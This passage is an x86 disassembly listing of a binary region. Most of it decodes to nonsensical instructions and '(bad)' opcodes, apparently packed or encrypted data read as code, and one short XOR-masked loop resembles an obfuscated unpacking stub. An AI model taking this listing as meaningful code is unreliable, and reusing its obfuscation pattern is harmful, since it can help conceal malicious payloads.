  403960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403961:	inc    esi
  403962:	sub    al,0xe4
  403964:	mov    ch,0x1c
  403966:	jge    0x403975
  403968:	cld    
  403969:	cmc    
  40396a:	cwde   
  40396b:	js     0x4039c6
  40396d:	call   esp
  40396f:	pop    ebx
  403970:	mov    ?,WORD PTR [edx]
  403972:	mov    ah,0x3e
  403974:	push   0xffffffaf
  403976:	and    al,0xc5
  403978:	mov    ds:0x6bb187b1,al
  40397d:	sbb    al,0x75
  40397f:	push   cs
  403980:	dec    eax
  403981:	push   ebx
  403982:	ins    WORD PTR es:[edi],dx
  403984:	sub    ch,BYTE PTR ss:[ecx+0x3b47f413]
  40398b:	sub    eax,0xd22eca9f
  403990:	fcmovnb st,st(0)
  403992:	call   0x6189:0xb7b57f48
  403999:	or     dl,cl
  40399b:	cmp    esi,ecx
  40399d:	jae    0x403989
  40399f:	push   esp
  4039a0:	xor    al,0xb3
  4039a2:	push   eax
  4039a3:	xor    BYTE PTR [ebx-0xcafcfcd],bh
  4039a9:	or     BYTE PTR [eax+0x6395c7e2],al
  4039af:	or     DWORD PTR [edx+ecx*2+0x44],esi
  4039b3:	cmp    dh,cl
  4039b5:	sub    BYTE PTR [edx-0x21],ah
  4039b8:	es ins BYTE PTR es:[edi],dx
  4039ba:	repz ja 0x4039cf
  4039bd:	mov    WORD PTR [ebx-0x50b83d3d],gs
  4039c3:	enter  0xba84,0xad
  4039c7:	sbb    al,bh
  4039c9:	sub    BYTE PTR [esi+0xe81e375],dh
  4039cf:	clc    
  4039d0:	arpl   WORD PTR [ebx+eiz*4-0x448529ef],dx
  4039d7:	dec    ecx
  4039d8:	mov    ch,0x28
  4039da:	je     0x40397f
  4039dc:	cmp    eax,esp
  4039de:	push   ecx
  4039df:	jbe    0x4039d5
  4039e1:	dec    eax
  4039e2:	lods   eax,DWORD PTR ds:[esi]
  4039e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e4:	jbe    0x403992
  4039e6:	int3   
  4039e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e8:	inc    esp
  4039e9:	xor    ecx,ebx
  4039eb:	loop   0x403995
  4039ed:	mov    al,0x1e
  4039ef:	mov    edi,0xc9fb8af5
  4039f4:	adc    ebp,DWORD PTR [ebp+edi*1-0x22]
  4039f8:	in     al,0xa7
  4039fa:	sbb    eax,0xccc370f6
  4039ff:	sub    ecx,DWORD PTR [esp+esi*4+0x7289a6ed]
  403a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a07:	cli    
  403a08:	inc    eax
  403a09:	cmp    dl,BYTE PTR [edx-0x6a42f2e8]
  403a0f:	jmp    0x403a3c
  403a11:	bound  esi,QWORD PTR [edi-0x55fc4e09]
  403a17:	sub    esi,DWORD PTR [ebx+0x63105880]
  403a1d:	cmp    BYTE PTR [esp+eiz*4+0x37],bl
  403a21:	sti    
  403a22:	in     al,dx
  403a23:	push   edi
  403a24:	loopne 0x4039ea
  403a26:	and    cl,bh
  403a28:	or     BYTE PTR [esi],cl
  403a2a:	xor    eax,0xf7bf165f
  403a2f:	dec    ecx
  403a30:	fst    DWORD PTR [edx]
  403a32:	dec    esp
  403a33:	push   ebx
  403a34:	nop
  403a35:	mov    dl,0x9f
  403a37:	stos   DWORD PTR es:[edi],eax
  403a38:	fisttp QWORD PTR [edi+0x7fddcb70]
  403a3e:	and    al,0xeb
  403a40:	mov    eax,ds:0xf7d1ab5c
  403a45:	xchg   ebp,eax
  403a46:	dec    ebx
  403a47:	jmp    0x403a77
  403a49:	inc    ebp
  403a4a:	push   ecx
  403a4b:	jl     0x4039f4
  403a4d:	and    bl,BYTE PTR [ebx-0x4ba585b0]
  403a53:	mov    al,ds:0x92a21354
  403a58:	fsub   DWORD PTR [edi-0x8]
  403a5b:	sub    ch,BYTE PTR [edx+0x68]
  403a5e:	or     eax,ebx
  403a60:	scas   eax,DWORD PTR es:[edi]
  403a61:	jg     0x4039e6
  403a63:	(bad)  
  403a64:	sub    al,0xcc
  403a66:	fwait
  403a67:	jb     0x4039ea
  403a69:	xchg   edx,eax
  403a6a:	mov    edx,0x4d01068d
  403a6f:	pop    ds
  403a70:	push   ecx
  403a71:	test   BYTE PTR [ebp-0x730ed8fd],dl
  403a77:	int    0x87
  403a79:	and    BYTE PTR [eax+0x6d5cca8f],dh
  403a7f:	ret    0xf4e9
  403a82:	fsubp  st(7),st
  403a84:	jp     0x403ac1
  403a86:	pop    es
  403a87:	in     eax,0x20
  403a89:	pushw  0x935
  403a8d:	pop    es
  403a8e:	loope  0x403a16
  403a90:	jbe    0x403afc
  403a92:	sqrtps xmm2,XMMWORD PTR [ebp-0x5c]
  403a96:	adc    eax,0xb2d45c7f
  403a9b:	cmp    al,0xb2
  403a9d:	mov    eax,ds:0x58f9c9ae
  403aa2:	fsubr  DWORD PTR [edx]
  403aa4:	cld    
  403aa5:	shl    BYTE PTR [ebx-0x49],cl
  403aa8:	stos   DWORD PTR es:[edi],eax
  403aa9:	adc    BYTE PTR [ebp+0x8564f53],cl
  403aaf:	mov    esi,0xbbe8f401
  403ab4:	or     ch,BYTE PTR ds:0xc2a64a03
  403aba:	sbb    DWORD PTR [esi+0x3f75187b],0xffffffce
  403ac1:	pop    edx
  403ac2:	push   ebx
  403ac3:	xchg   ebp,eax
  403ac4:	je     0x403b11
  403ac6:	std    
  403ac7:	or     al,0xed
  403ac9:	aad    0x59
  403acb:	cmp    eax,edx
  403acd:	sbb    edx,esi
  403acf:	es jmp 0x403aea
  403ad2:	pop    esp
  403ad3:	es sbb eax,0xf48d2b92
  403ad9:	mov    ebx,0xd93ba311
  403ade:	pop    es
  403adf:	adc    BYTE PTR [edx-0x49],cl
  403ae2:	call   0x78ed:0x8897bafc
  403ae9:	adc    BYTE PTR [esi+edx*1+0x622a2d9e],dh
  403af0:	(bad)  
  403af2:	mov    cl,0xdf
  403af4:	lahf   
  403af5:	mov    ecx,0x726b1ae4
  403afa:	dec    DWORD PTR [ecx+0x9]
  403afd:	push   edx
  403afe:	retf   0x5f43
  403b01:	add    al,0x77
  403b03:	(bad)  
  403b04:	call   0x2494fd33
  403b09:	mov    ah,0xf6
  403b0b:	mov    ch,0xa6
  403b0d:	cmp    eax,0x3c8b94f0
  403b12:	aas    
  403b13:	scas   al,BYTE PTR es:[edi]
  403b14:	cmp    edx,ecx
  403b16:	mov    ecx,DWORD PTR [ebp-0xc]
  403b19:	mov    DWORD PTR [ebp+0x8],ecx
  403b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  403b1f:	je     0x406073
  403b25:	jmp    0x403b5a
  403b2a:	mov    ecx,DWORD PTR [ebp+0x8]
  403b2d:	mov    edx,DWORD PTR [ebp-0x8]
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp+0x2e17f475]
  403bc0:	lock outs dx,BYTE PTR ds:[esi]
  403bc2:	sbb    al,0x5f
  403bc4:	bound  esp,QWORD PTR [edx+0x1c]
  403bc7:	pop    edi
  403bc8:	bound  esp,QWORD PTR [edx+0x1d]
  403bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bcc:	pop    eax
  403bcd:	mov    ?,WORD PTR [esi+0x115b84a4]
  403bd3:	fisttp DWORD PTR [edi-0x509bbfe9]
  403bd9:	sbb    DWORD PTR [ecx+0x52912246],ecx
  403bdf:	inc    ecx
  403be0:	out    dx,eax
  403be1:	jbe    0x403bcb
  403be3:	mov    edx,0xe096a453
  403be8:	in     eax,0x48
  403bea:	shl    DWORD PTR [esi+0x70d7653a],1
  403bf0:	iret   
  403bf1:	hlt    
  403bf2:	stc    
  403bf3:	pop    edx
  403bf4:	mov    DWORD PTR [ecx],edx
  403bf6:	push   ds
  403bf7:	jmp    DWORD PTR [ecx-0xf]
  403bfa:	xor    eax,DWORD PTR [eax]
  403bfc:	jbe    0x403c63
  403bfe:	xchg   DWORD PTR [esi+edi*1+0x3c9954b7],edi
  403c05:	cmp    al,0xce
  403c07:	and    al,0x3b
  403c09:	icebp  
  403c0a:	ret    0x26dc
  403c0d:	sti    
  403c0e:	xchg   esi,eax
  403c0f:	fdivr  QWORD PTR [ebx+0x134ff332]
  403c15:	popa   
  403c16:	mov    ds:0x549a1958,eax
  403c1b:	cld    
  403c1c:	mov    eax,0x671b454b
  403c21:	cwde   
  403c22:	(bad)  
  403c23:	loope  0x403bcb
  403c25:	(bad)  
  403c26:	(bad)  
  403c28:	push   cs
  403c29:	jae    0x403c61
  403c2b:	jle    0x403c91
  403c2d:	jmp    0x403bee
  403c2f:	data16 int3 
  403c31:	imul   esi,ecx,0x68
  403c34:	dec    ebx
  403c35:	pop    ds
  403c36:	mov    dl,0x85
  403c38:	add    eax,0x5a830082
  403c3d:	mov    ?,WORD PTR [edx-0x7e2fb4e4]
  403c43:	jo     0x403bf2
  403c45:	xor    al,ah
  403c47:	add    DWORD PTR [edi+edi*1+0x1715a92b],0x10
  403c4f:	push   esi
  403c50:	adc    cl,BYTE PTR [ecx]
  403c52:	xlat   BYTE PTR ds:[ebx]
  403c53:	mov    edi,0x7249b434
  403c58:	ds push 0xffffffc0
  403c5b:	test   DWORD PTR [edi],esp
  403c5d:	jmp    0xd533743e
  403c62:	xor    al,0x3a
  403c64:	inc    edx
  403c65:	add    edx,DWORD PTR [eiz*4-0x6d83876c]
  403c6c:	sbb    al,0x4c
  403c6e:	pusha  
  403c6f:	outs   dx,BYTE PTR ds:[esi]
  403c70:	mov    ebp,DWORD PTR [edx-0x1d]
  403c73:	shr    edi,cl
  403c75:	pop    ebp
  403c76:	int    0xab
  403c78:	loopne 0x403c42
  403c7a:	adc    ebp,DWORD PTR [edx+0x4d]
  403c7d:	dec    edx
  403c7e:	repz push esp
  403c80:	outs   dx,BYTE PTR ds:[esi]
  403c81:	push   ebp
  403c82:	ror    BYTE PTR [esi-0x5e],1
  403c85:	xchg   esi,eax
  403c86:	mov    bl,dl
  403c88:	adc    al,0xaf
  403c8a:	mov    edi,0x55a638ac
  403c8f:	out    dx,eax
  403c90:	adc    DWORD PTR [esi-0x39],ebp
  403c93:	sbb    ebp,0xffffffe9
  403c96:	and    sp,dx
  403c99:	aas    
  403c9a:	push   ebx
  403c9b:	sahf   
  403c9c:	jns    0x403ccf
  403c9e:	add    DWORD PTR [esi],ecx
  403ca0:	int    0x6f
  403ca2:	ins    DWORD PTR es:[edi],dx
  403ca3:	sub    al,0x9d
  403ca5:	lahf   
  403ca6:	push   ss
  403ca7:	mov    ds,WORD PTR [esi-0x40c639ba]
  403cad:	enter  0xd7b4,0x12
  403cb1:	mov    ch,0xee
  403cb3:	out    dx,al
  403cb4:	dec    ebp
  403cb5:	xchg   esp,eax
  403cb6:	jl     0x403cd5
  403cb8:	rol    DWORD PTR [edx-0x488944f4],1
  403cbe:	xchg   edx,eax
  403cbf:	or     edi,0x95226ac4
  403cc5:	ret    
  403cc6:	cmc    
  403cc7:	push   edi
  403cc8:	fs adc al,0xb0
  403ccb:	repz add al,0xc0
  403cce:	out    0x20,al
  403cd0:	into   
  403cd1:	pop    ebx
  403cd2:	aaa    
  403cd3:	(bad)  
  403cd4:	fisubr DWORD PTR [ebp+0xc]
  403cd7:	stos   BYTE PTR es:[edi],al
  403cd8:	mov    dh,0xb9
  403cda:	adc    eax,0x8ba0f84a
  403cdf:	dec    edx
  403ce0:	lahf   
  403ce1:	(bad)  
  403ce2:	mov    edi,0x96234aa5
  403ce7:	mov    bl,0xb1
  403ce9:	dec    ecx
  403cea:	jmp    0x403d37
  403cec:	sar    esp,0x37
  403cef:	fwait
  403cf0:	ins    BYTE PTR es:[edi],dx
  403cf1:	jg     0x403d06
  403cf3:	mov    esp,esp
  403cf5:	pop    edx
  403cf6:	fs je  0x403d3f
  403cf9:	mov    ah,0x1b
  403cfb:	rcl    DWORD PTR [eiz*2+0x2f7d6c92],0x5e
  403d03:	mov    bl,0x99
  403d05:	imul   bl
  403d07:	leave  
  403d08:	sub    edi,ebp
  403d0a:	mov    cl,0xf
  403d0c:	(bad)  
  403d0d:	fwait
  403d0e:	test   BYTE PTR [ebp-0x5],cl
  403d11:	xchg   ebx,eax
  403d12:	loop   0x403cd0
  403d14:	shl    DWORD PTR [edi+0x43],cl
  403d17:	jns    0x403ca6
  403d19:	inc    esi
  403d1a:	(bad)  
  403d1b:	dec    esi
  403d1c:	cld    
  403d1d:	xchg   edx,eax
  403d1e:	and    DWORD PTR [ebp+0x1d],0xffffff95
  403d22:	hlt    
  403d23:	cmc    
  403d24:	mov    dl,BYTE PTR [esi]
  403d26:	jle    0x403cc7
  403d28:	aad    0xb9
  403d2a:	xchg   edx,eax
  403d2b:	push   ebp
  403d2c:	into   
  403d2d:	lods   eax,DWORD PTR ds:[esi]
  403d2e:	fwait
  403d2f:	mov    cl,0xc
  403d31:	ret    
  403d32:	jne    0x403d73
  403d34:	nop
  403d35:	ficomp WORD PTR ds:0xc2b30b9c
  403d3b:	lea    ebx,[ebx+0x3f93a25b]
  403d41:	test   eax,0x2e9eed69
  403d46:	add    bh,BYTE PTR [eax-0x2]
  403d49:	adc    eax,0xf5b3959a
  403d4e:	mov    ebx,0xd4612856
  403d53:	cli    
  403d54:	in     eax,0xfa
  403d56:	out    0x30,eax
  403d58:	adc    DWORD PTR [esi+0x7d],edi
  403d5b:	sub    eax,0x5aecb802
  403d60:	ror    BYTE PTR [edi+edx*8-0x4bc6554b],cl
  403d67:	push   0x2c
  403d69:	pop    ax
  403d6b:	dec    esi
  403d6c:	hlt    
  403d6d:	dec    edi
  403d6e:	test   dl,bh
  403d70:	mov    esi,0x3199cd23
  403d75:	jecxz  0x403d75
  403d77:	xchg   DWORD PTR [esi-0x3559c1a0],esp
  403d7d:	scas   eax,DWORD PTR es:[edi]
  403d7e:	jl     0x403d9f
  403d80:	lods   eax,DWORD PTR ds:[esi]
  403d81:	loopne 0x403d5a
  403d83:	fiadd  WORD PTR [ebp+0x61]
  403d86:	enter  0x23ff,0x94
  403d8a:	push   eax
  403d8b:	cdq    
  403d8c:	(bad)  
  403d8e:	cmp    al,0xd2
  403d90:	int    0x1c
  403d92:	mov    BYTE PTR [esi+0x553e4e97],al
  403d98:	cmc    
  403d99:	pop    DWORD PTR [ebx-0x7cf577eb]
  403d9f:	out    dx,eax
  403da0:	in     eax,dx
  403da1:	or     al,0xad
  403da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da4:	in     al,0x85
  403da6:	nop
  403da7:	shr    DWORD PTR [edx],cl
  403da9:	sahf   
  403daa:	ins    BYTE PTR es:[edi],dx
  403dab:	fcom   DWORD PTR [edi+0x2a]
  403dae:	xor    al,0x8c
  403db0:	add    DWORD PTR [ebx],eax
  403db2:	outs   dx,DWORD PTR ds:[esi]
  403db3:	js     0x403dfd
  403db5:	xchg   BYTE PTR [eax],dh
  403db7:	add    BYTE PTR [ebx-0x3b50e202],dl
  403dbd:	dec    ebp
  403dbe:	test   DWORD PTR ds:0xe0e7840d,edx
  403dc4:	(bad)  
  403dc5:	cmp    BYTE PTR [esi-0x554d5936],bl
  403dcb:	push   0x2ac4787c
  403dd0:	or     DWORD PTR [esi+0x43d592cb],esi
  403dd6:	add    ch,BYTE PTR [eax]
  403dd8:	ffree  st(4)
  403dda:	jmp    DWORD PTR [esi+eax*1-0x1aedf243]
  403de1:	sub    eax,0x33f64375
  403de6:	cmp    al,bl
  403de8:	cmp    al,0x21
  403dea:	pusha  
  403deb:	cmp    BYTE PTR [ebp-0xdc06bb],dl
  403df1:	ins    DWORD PTR es:[edi],dx
  403df2:	sbb    eax,0xae644cc5
  403df7:	mov    dh,0x32
  403df9:	xchg   esi,eax
  403dfa:	fst    DWORD PTR [ebp+0x57]
  403dfd:	aas    
  403dfe:	sbb    BYTE PTR [ebx-0x2e],al
  403e01:	test   eax,0x451b45e8
  403e06:	xchg   ebx,eax
  403e07:	(bad)  
  403e08:	out    0xa8,al
  403e0a:	cmp    edx,edx
  403e0c:	std    
  403e0d:	shl    BYTE PTR [ebx+0x4b],cl
  403e10:	pusha  
  403e11:	inc    edx
  403e12:	scas   al,BYTE PTR es:[edi]
  403e13:	sbb    al,0xf9
  403e15:	push   eax
  403e16:	mul    BYTE PTR [ecx+0x233eb]
  403e1c:	(bad)  
  403e1d:	push   ebp
  403e1e:	loop   0x403e7a
  403e20:	ja     0x403e5b
  403e22:	pop    es
  403e23:	xchg   edx,eax
  403e24:	and    al,0x52
  403e26:	ins    BYTE PTR es:[edi],dx
  403e27:	mov    al,ds:0xe3c6878a
  403e2c:	sub    BYTE PTR [ebx+0x2c],0xa9
  403e30:	cmp    edi,DWORD PTR [ebp-0x604e70ab]
  403e36:	jle    0x403e3b
  403e38:	cmc    
  403e39:	cmc    
  403e3a:	mov    esi,0x477fcbae
  403e3f:	shl    BYTE PTR [eax-0x4cec3de1],0x47
  403e46:	xchg   DWORD PTR [ecx-0x7b2842a3],ebx
  403e4c:	or     DWORD PTR [ecx+0x211db80f],esp
  403e52:	mov    esi,0x9f9d9322
  403e57:	addr16 addr16 js 0x403e79
  403e5b:	stos   BYTE PTR es:[edi],al
  403e5c:	popa   
  403e5d:	jl     0x403e60
  403e5f:	dec    ebx
  403e60:	mov    ch,0xea
  403e62:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403e64:	xor    ebp,DWORD PTR [edi-0x7b48f11b]
  403e6a:	push   edx
  403e6b:	lea    ebx,[esi-0x5d]
  403e6e:	pop    ecx
  403e6f:	inc    edi
  403e70:	dec    esi
  403e71:	sbb    edx,ebp
  403e73:	fld    TBYTE PTR [ebx]
  403e75:	xchg   esi,eax
  403e76:	aas    
  403e77:	lds    ebx,FWORD PTR [edi]
  403e79:	psraw  mm4,mm4
  403e7c:	in     eax,dx
  403e7d:	in     al,0xf7
  403e7f:	jnp    0x403e7c
  403e81:	sbb    ebx,DWORD PTR [esi+0x28bc4f79]
  403e87:	shl    DWORD PTR [ebp+0x7892b564],1
  403e8d:	cmp    ebp,DWORD PTR [edx+0x63]
  403e90:	dec    edi
  403e91:	enter  0xdb21,0x3e
  403e95:	adc    al,0x54
  403e97:	jno    0x403e48
  403e99:	jb     0x403eb2
  403e9b:	mov    ah,BYTE PTR [ecx]
  403e9d:	mov    ecx,0x2b23f743
  403ea2:	wrmsr  
  403ea4:	jmp    0x403f07
  403ea6:	add    bh,BYTE PTR [eax+0x62]
  403ea9:	fwait
  403eaa:	jmp    0xdbbed668
  403eaf:	push   0x714abeef
  403eb4:	iret   
  403eb5:	sub    edi,DWORD PTR [esi]
  403eb7:	aad    0x6
  403eb9:	xchg   esp,eax
  403eba:	loope  0x403ef6
  403ebc:	add    ecx,DWORD PTR [edi-0x68]
  403ebf:	inc    esi
  403ec0:	je     0x403ee1
  403ec2:	sub    DWORD PTR [edi+0x57],ebp
  403ec5:	inc    ecx
  403ec6:	sub    eax,0x4bbc7fe0
  403ecb:	pop    ecx
  403ecc:	pop    ebp
  403ecd:	adc    al,0x79
  403ecf:	mov    bh,0x93
  403ed1:	lds    edi,FWORD PTR [eax+0x31]
  403ed4:	nop
  403ed5:	popf   
  403ed6:	sbb    dl,BYTE PTR [eax-0x46]
  403ed9:	xchg   ecx,eax
  403eda:	mov    ds:0x3048e975,eax
  403edf:	pop    edx
  403ee0:	inc    ebp
  403ee1:	cli    
  403ee2:	mov    dl,0xa4
  403ee4:	cmp    ebp,DWORD PTR [ecx]
  403ee6:	fst    DWORD PTR [ecx-0x2f]
  403ee9:	shl    DWORD PTR [esi-0x6e],0xca
  403eed:	mov    edi,0xcc8e454e
  403ef2:	push   eax
  403ef3:	sub    dh,BYTE PTR [ebx+ebp*8+0x65]
  403ef7:	daa    
  403ef8:	jecxz  0x403eea
  403efa:	jecxz  0x403f13
  403efc:	sbb    DWORD PTR [ebx+0x1d],0x8ab0add3
  403f03:	cs cld 
  403f05:	xor    eax,0xe97bece
  403f0a:	push   esi
  403f0b:	cmp    al,0x5f
  403f0d:	xchg   esp,eax
  403f0e:	fidivr WORD PTR [ecx]
  403f10:	inc    ebx
  403f11:	adc    al,0x52
  403f13:	ds imul edi,eax,0x31ec631b
  403f1a:	in     al,0xf5
  403f1c:	mov    esp,0xf46ab083
  403f21:	adc    eax,0xf738ec92
  403f26:	push   ebp
  403f27:	mov    ch,0xb8
  403f29:	xor    al,0x24
  403f2b:	mov    bh,0x5e
  403f2d:	fs jle 0x403f43
  403f30:	mov    ds:0x8cbb9c06,eax
  403f35:	mov    ds:0xc7105fd6,eax
  403f3a:	fs jne 0x403f6b
  403f3d:	(bad)  
  403f3e:	out    0xcd,eax
  403f40:	push   ebp
  403f41:	shl    DWORD PTR [ebx-0x9],0xf7
  403f45:	icebp  
  403f46:	(bad)  
  403f47:	in     eax,0x6e
  403f49:	aaa    
  403f4a:	add    DWORD PTR ds:0x2f236de1,esp
  403f50:	gs mov dl,0x57
  403f53:	shl    BYTE PTR [ecx+0x5c60cd6a],cl
  403f59:	mov    ecx,0x7e955948
  403f5e:	dec    ecx
  403f5f:	sub    ebx,DWORD PTR [ebx]
  403f61:	lock data16 jp 0x403f4c
  403f65:	ret    
  403f66:	fisttp WORD PTR fs:[edx+eax*1]
  403f6a:	test   bh,bl
  403f6c:	sbb    bl,BYTE PTR [ebx]
  403f6e:	xchg   edx,eax
  403f6f:	push   eax
  403f70:	sbb    cl,bh
  403f72:	xor    BYTE PTR [ecx+0x3d20027c],dh
  403f78:	fcom   QWORD PTR [ebp+0x66782a]
  403f7e:	xor    dl,BYTE PTR [ecx]
  403f80:	jmp    0xb2635d
  403f85:	or     esp,ebx
  403f87:	adc    ebx,DWORD PTR [ebx+0x3ae8211b]
  403f8d:	sbb    dh,BYTE PTR [esi]
  403f8f:	mov    edi,0x5baff4d4
  403f94:	test   eax,edi
  403f96:	pop    ds
  403f97:	mov    bh,0x46
  403f99:	scas   al,BYTE PTR es:[edi]
  403f9a:	add    eax,0x4ddaf72c
  403f9f:	pop    ecx
  403fa0:	cmp    eax,DWORD PTR [ebp+0x46094902]
  403fa6:	out    dx,eax
  403fa7:	(bad)  
  403fa8:	icebp  
  403fa9:	and    BYTE PTR [edi+0x2373600c],dh
  403faf:	jns    0x403fd7
  403fb1:	(bad)  
  403fb3:	adc    al,BYTE PTR [eax+0x25]
  403fb6:	int3   
  403fb7:	xchg   edi,eax
  403fb8:	or     eax,0x56d53527
  403fbd:	sbb    dl,BYTE PTR [ecx-0x2c]
  403fc0:	hlt    
  403fc1:	mov    edi,0xcdfaa42f
  403fc6:	iret   
  403fc7:	ins    DWORD PTR es:[edi],dx
  403fc8:	jb     0x403fb9
  403fca:	jns    0x404043
  403fcc:	data16 add BYTE PTR [esi],al
  403fcf:	lock shr DWORD PTR fs:[esi],cl
  403fd3:	cdq    
  403fd4:	dec    dl
  403fd6:	and    al,0xbf
  403fd8:	nop
  403fd9:	or     DWORD PTR [ebp+edx*2+0x10],0xffffffb7
  403fde:	push   cs
  403fdf:	jp     0x403fa1
  403fe1:	mov    ecx,0x3e274e03
  403fe6:	rcl    BYTE PTR [ebp+0x244fb7fc],1
  403fec:	mov    dh,0xe3
  403fee:	pop    esp
  403fef:	jle    0x403fb5
  403ff1:	jecxz  0x404057
  403ff3:	pop    es
  403ff4:	repz xor DWORD PTR [ecx+0x77],esp
  403ff8:	add    DWORD PTR [ebx-0x75],eax
  403ffb:	sahf   
  403ffc:	jle    0x404070
  403ffe:	sbb    DWORD PTR [eax-0x19df0f68],esi
  404004:	(bad)  
  404007:	gs dec ecx
  404009:	mov    edx,DWORD PTR [edx+0x1e]
  40400c:	xchg   edi,eax
  40400d:	fidiv  WORD PTR [esi]
  40400f:	aam    0xa6
  404011:	push   esp
  404012:	dec    edi
  404013:	out    0x35,al
  404015:	push   ecx
  404016:	stc    
  404017:	dec    edi
  404018:	or     ah,ah
  40401a:	push   ebp
  40401b:	std    
  40401c:	add    BYTE PTR cs:[esi],0x21
  404020:	jbe    0x403fd0
  404022:	push   ss
  404023:	inc    edx
  404024:	repz push ebp
  404026:	adc    eax,0x4db0ea93
  40402b:	shl    edx,1
  40402d:	imul   ebp,DWORD PTR [esi-0x32f821b1],0xffffffb2
  404034:	mov    edi,0xd91cbb34
  404039:	cmp    BYTE PTR [ecx+ecx*4-0x22],bh
  40403d:	mov    ch,0x49
  40403f:	add    al,0x6a
  404041:	sub    bh,bh
  404043:	mov    eax,0xca3096c3
  404048:	adc    eax,0xf48f6b3f
  40404d:	sar    dl,0x69
  404050:	scas   al,BYTE PTR es:[edi]
  404051:	scas   eax,DWORD PTR es:[edi]
  404052:	sub    eax,DWORD PTR [esi+0x5367c97c]
  404058:	lahf   
  404059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40405a:	in     eax,dx
  40405b:	jns    0x404025
  40405d:	(bad)  
  40405e:	adc    eax,0xbc974097
  404063:	inc    edi
  404064:	xchg   ebx,eax
  404065:	mov    dl,0x12
  404067:	fdivr  QWORD PTR [esi+0x7e]
  40406a:	pop    edi
  40406b:	push   0xffffff93
  40406d:	lock sub al,0x82
  404070:	xchg   esp,eax
  404071:	jecxz  0x4040c1
  404073:	mov    DWORD PTR [ebp-0x38857bb8],eax
  404079:	adc    eax,DWORD PTR [eax+0xa2dfa3b]
  40407f:	(bad)  
  404080:	mov    DWORD PTR ds:0x5c2a9eab,0xed8f9751
  40408a:	push   es
  40408b:	jno    0x4040da
  40408d:	fcmovb st,st(4)
  40408f:	pusha  
  404090:	mov    ds:0x795445d4,eax
  404095:	cmp    ch,ch
  404097:	jg     0x404024
  404099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409a:	je     0x40404d
  40409c:	mov    al,ds:0x5fbb30ce
  4040a1:	in     eax,dx
  4040a2:	pop    esi
  4040a3:	xchg   esi,eax
  4040a4:	je     0x40407e
  4040a6:	xor    eax,DWORD PTR ds:0x26d80f57
  4040ac:	pop    ss
  4040ad:	push   es
  4040ae:	add    al,0x39
  4040b0:	xor    ecx,DWORD PTR [ebp+0x8f06f0f]
  4040b6:	sbb    al,0x57
  4040b8:	adc    cl,BYTE PTR [eax]
  4040ba:	inc    ebx
  4040bb:	ins    DWORD PTR es:[edi],dx
  4040bc:	xor    BYTE PTR [ebp+0x77],bl
  4040bf:	addr16 jle 0x40406e
  4040c2:	stc    
  4040c3:	ins    BYTE PTR es:[edi],dx
  4040c4:	pop    edx
  4040c5:	test   BYTE PTR [eax-0x64088062],bl
  4040cb:	xor    bh,ah
  4040cd:	push   ds
  4040ce:	hlt    
  4040cf:	lods   eax,DWORD PTR ds:[esi]
  4040d0:	retf   0xb13c
  4040d3:	nop
  4040d4:	or     BYTE PTR [edi+ecx*8-0x6286f8c],bh
  4040db:	mov    ebx,ebp
  4040dd:	mov    ?,WORD PTR [ebp-0x9a0b93b]
  4040e3:	(bad)  
  4040e4:	hlt    
  4040e5:	cmp    dh,BYTE PTR [ebx]
  4040e7:	dec    edx
  4040e8:	enter  0xe393,0xc
  4040ec:	jl     0x404155
  4040ee:	out    dx,eax
  4040ef:	xchg   DWORD PTR [ecx],esp
  4040f1:	jl     0x40407c
  4040f3:	push   ecx
  4040f4:	fs jns 0x40407b
  4040f7:	retf   0xb4ea
  4040fa:	lods   eax,DWORD PTR ds:[esi]
  4040fb:	cld    
  4040fc:	rol    DWORD PTR [eax+0x4e],1
  4040ff:	push   ecx
  404100:	xor    al,0x6e
  404102:	pop    edi
  404103:	push   ebx
  404104:	sub    DWORD PTR [ecx+0x56],edi
  404107:	jns    0x4040af
  404109:	xchg   esi,eax
  40410a:	mov    DWORD PTR [ecx],esi
